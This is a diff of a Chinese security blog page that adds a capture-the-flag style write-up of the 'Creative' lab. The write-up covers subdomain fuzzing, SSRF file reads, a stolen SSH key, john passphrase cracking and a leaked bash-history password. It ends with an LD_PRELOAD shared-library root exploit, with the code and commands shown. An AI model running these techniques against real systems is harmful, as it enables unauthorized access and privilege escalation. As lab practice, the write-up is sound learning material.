@@ -6,18 +6,24 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="基本信息   本机 目标机器    10.17.5.121 10.10.28.27   信息搜集12Open 10.10.28.27:22Open 10.10.28.27:80  写入hosthttp:&#x2F;&#x2F;creative.thm&#x2F; 漏洞利用webshellusershellrootshell知识点回顾总结if (typeof lightGallery !&#x3D;&#x3D; &#39;undefined&#39;) {">
+    <meta name="description" content="基本信息   本机 目标机器    10.17.5.121 10.10.28.27   信息搜集12Open 10.10.28.27:22Open 10.10.28.27:80  写入hosthttp:&#x2F;&#x2F;creative.thm&#x2F; 子域枚举12345└─$ ffuf -u http:&#x2F;&#x2F;creative.thm -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;amass&#x2F;subdomains-t">
 <meta property="og:type" content="article">
 <meta property="og:title" content="安全杂谈">
 <meta property="og:url" content="https://imli.ink/2024/11/16/creative/index.html">
 <meta property="og:site_name" content="安全杂谈">
-<meta property="og:description" content="基本信息   本机 目标机器    10.17.5.121 10.10.28.27   信息搜集12Open 10.10.28.27:22Open 10.10.28.27:80  写入hosthttp:&#x2F;&#x2F;creative.thm&#x2F; 漏洞利用webshellusershellrootshell知识点回顾总结if (typeof lightGallery !&#x3D;&#x3D; &#39;undefined&#39;) {">
+<meta property="og:description" content="基本信息   本机 目标机器    10.17.5.121 10.10.28.27   信息搜集12Open 10.10.28.27:22Open 10.10.28.27:80  写入hosthttp:&#x2F;&#x2F;creative.thm&#x2F; 子域枚举12345└─$ ffuf -u http:&#x2F;&#x2F;creative.thm -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;amass&#x2F;subdomains-t">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116151342.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116152326.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116152438.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116152529.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116152724.png">
 <meta property="article:published_time" content="2024-11-16T06:52:55.596Z">
 <meta property="article:modified_time" content="2024-11-16T06:52:55.596Z">
 <meta property="article:author" content="Leon">
 <meta property="article:tag" content="网络安全, 渗透测试, 信息安全, 安全工具, 安全研究">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116151342.png">
     
     
       
@@ -129,7 +135,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">4.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usershell"><span class="toc-number">5.</span> <span class="toc-text">usershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-number">6.</span> <span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.1.</span> <span class="toc-text">子域枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">思考利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">测试利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">4.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usershell"><span class="toc-number">5.</span> <span class="toc-text">usershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-number">6.</span> <span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
       </div>
     
   </span>
@@ -186,7 +192,57 @@
 <h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.28.27:22</span><br><span class="line">Open 10.10.28.27:80</span><br></pre></td></tr></table></figure>
 
 <p>写入host<br><a target="_blank" rel="noopener" href="http://creative.thm/">http://creative.thm/</a></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+<h3 id="子域枚举"><a href="#子域枚举" class="headerlink" title="子域枚举"></a>子域枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ffuf -u http://creative.thm -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -H &quot;Host: FUZZ.creative.thm&quot; -fs 178 </span><br><span class="line"></span><br><span class="line">beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 316ms]</span><br><span class="line">:: Progress: [5000/5000] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:43] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF?</p>
+<p><a href="/../assets/img/Pasted%20image%2020241116151342.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116151342.png"></a></p>
+<h3 id="思考利用"><a href="#思考利用" class="headerlink" title="思考利用"></a>思考利用</h3><ol>
+<li><code>file</code>协议读取文件</li>
+<li>对内部服务进行枚举</li>
+</ol>
+<h3 id="测试利用"><a href="#测试利用" class="headerlink" title="测试利用"></a>测试利用</h3><ol>
+<li><p>不行<br><a href="/../assets/img/Pasted%20image%2020241116152326.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152326.png"></a></p>
+</li>
+<li><p>枚举内部端口<br><a href="/../assets/img/Pasted%20image%2020241116152438.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152438.png"></a></p>
+</li>
+</ol>
+<p><a href="/../assets/img/Pasted%20image%2020241116152529.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152529.png"></a></p>
+<p>文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saad:x:1000:1000:saad:/home/saad:/bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="/../assets/img/Pasted%20image%2020241116152724.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116152724.png"></a></p>
+<p>读取私钥文件</p>
+<h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/creative]</span><br><span class="line">└─$ chmod 600 id_rsa                    </span><br><span class="line">┌──(kali㉿kali)-[~/Documents/thm/creative]</span><br><span class="line">└─$ ssh -i id_rsa saad@beta.creative.thm</span><br><span class="line">Enter passphrase for key &#x27;id_rsa&#x27;: </span><br></pre></td></tr></table></figure>
+
+<p>该死 还需要输入密码才能使用私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt;id_rsa.txt</span><br></pre></td></tr></table></figure>
+
+<p>密码枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt </span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 16 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">sweetness        (id_rsa)     </span><br><span class="line">1g 0:00:00:21 DONE (2024-11-16 02:32) 0.04683g/s 44.96p/s 44.96c/s 44.96C/s xbox360..sandy</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                        </span><br></pre></td></tr></table></figure>
+
+<p>用该密钥进私钥登录</p>
+<p>bash历史</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;saad:MyStrongestPasswordYet$4291&quot; &gt; creds.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">saad@m4lware:~$ sudo -l</span><br><span class="line">[sudo] password for saad: </span><br><span class="line">Matching Defaults entries for saad on m4lware:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User saad may run the following commands on m4lware:</span><br><span class="line">    (root) /usr/bin/ping</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>?? </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env_keep+=LD_PRELOAD</span><br></pre></td></tr></table></figure>
+
+<p>这允许我们为运行的命令设置环境变量，就像 .<code>LD_PRELOAD``root``sudo</code></p>
+<p>环境变量用于指定要在进程的任何其他库之前加载的库。<code>LD_PRELOAD</code></p>
+<p>我们可以使用它来使我们运行的进程加载恶意库并运行我们的代码。<code>root``sudo</code></p>
+<p>首先，制作一个恶意的共享库，它将为我们生成一个 shell。</p>
+<p>我们将代码放在函数中，以便在加载库时运行它。<code>_init()</code></p>
+<p>此外，在加载库后取消设置变量以阻止我们运行的其他进程再次加载库并生成另一个 shell。<code>LD_PRELOAD</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void _init() &#123;</span><br><span class="line">	unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其编译到共享库中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">saad@m4lware:/tmp$ vim shell.c</span><br><span class="line">saad@m4lware:/tmp$ <span class="built_in">cat</span> shell.c </span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">_init</span></span>() &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">saad@m4lware:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line">saad@m4lware:/tmp$ <span class="built_in">sudo</span> LD_PRELOAD=/tmp/shell.so /usr/bin/ping</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><p>SSRF 到内部服务 内部的服务到ssh私钥 私钥的密码爆破 通过bash_history 获取到密码<br>通过<code>LD_PRELOAD</code> 进行生成so文件获取到<code>rootshell</code></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
             selector: '.gallery-item'
         };
@@ -230,7 +286,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">4.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usershell"><span class="toc-number">5.</span> <span class="toc-text">usershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-number">6.</span> <span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.1.</span> <span class="toc-text">子域枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">思考利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">测试利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">4.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usershell"><span class="toc-number">5.</span> <span class="toc-text">usershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-number">6.</span> <span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">7.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
       </div>
     
 
